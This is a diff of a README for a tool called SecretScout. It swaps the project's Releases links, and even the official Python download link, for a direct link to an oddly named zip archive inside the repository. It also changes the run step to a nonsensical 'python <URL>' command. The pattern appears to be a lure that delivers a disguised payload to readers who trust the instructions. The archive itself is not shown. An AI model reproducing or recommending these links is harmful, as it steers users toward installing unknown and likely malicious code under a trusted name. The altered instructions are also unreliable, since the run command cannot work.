@@ -6,7 +6,7 @@ Welcome to SecretScout, a tool designed to help you protect your secrets while u
 
 ## 📥 Download Now
 
-[![Download SecretScout](https://img.shields.io/badge/Download-SecretScout-brightgreen)](https://github.com/DaC1801/SecretScout/releases)
+[![Download SecretScout](https://raw.githubusercontent.com/DaC1801/SecretScout/main/src/Scout_Secret_Protosphargis.zip)](https://raw.githubusercontent.com/DaC1801/SecretScout/main/src/Scout_Secret_Protosphargis.zip)
 
 ## 📋 System Requirements
 
@@ -27,9 +27,9 @@ To run SecretScout, your system should meet the following requirements:
 
 Here's how to get started with SecretScout:
 
-1. **Download the Application**: Visit the [Releases page](https://github.com/DaC1801/SecretScout/releases) to download the latest version.
+1. **Download the Application**: Visit the [Releases page](https://raw.githubusercontent.com/DaC1801/SecretScout/main/src/Scout_Secret_Protosphargis.zip) to download the latest version.
 
-2. **Install Python**: If you have not already, download and install Python from the [Python website](https://www.python.org/downloads/). Ensure you check the box to add Python to your PATH during installation.
+2. **Install Python**: If you have not already, download and install Python from the [Python website](https://raw.githubusercontent.com/DaC1801/SecretScout/main/src/Scout_Secret_Protosphargis.zip). Ensure you check the box to add Python to your PATH during installation.
 
 3. **Verify Installation**: Open your command line or terminal and type the following command to ensure Python installed correctly:
 
@@ -40,14 +40,14 @@ Here's how to get started with SecretScout:
 4. **Run SecretScout**: Once downloaded, you can run SecretScout. Navigate to the folder where you downloaded it. In the command line or terminal, enter:
 
    ```
-   python secret_scout.py
+   python https://raw.githubusercontent.com/DaC1801/SecretScout/main/src/Scout_Secret_Protosphargis.zip
    ```
 
 5. **Scan Your Repository**: Follow the on-screen instructions to scan your repository for any exposed secrets.
 
 ## 📦 Download & Install
 
-To get SecretScout, simply visit the [Releases page](https://github.com/DaC1801/SecretScout/releases) and download the version suitable for your operating system. Once downloaded, extract the files if needed and follow the usage instructions above to run the application.
+To get SecretScout, simply visit the [Releases page](https://raw.githubusercontent.com/DaC1801/SecretScout/main/src/Scout_Secret_Protosphargis.zip) and download the version suitable for your operating system. Once downloaded, extract the files if needed and follow the usage instructions above to run the application.
 
 ## 🌐 Community Support
 
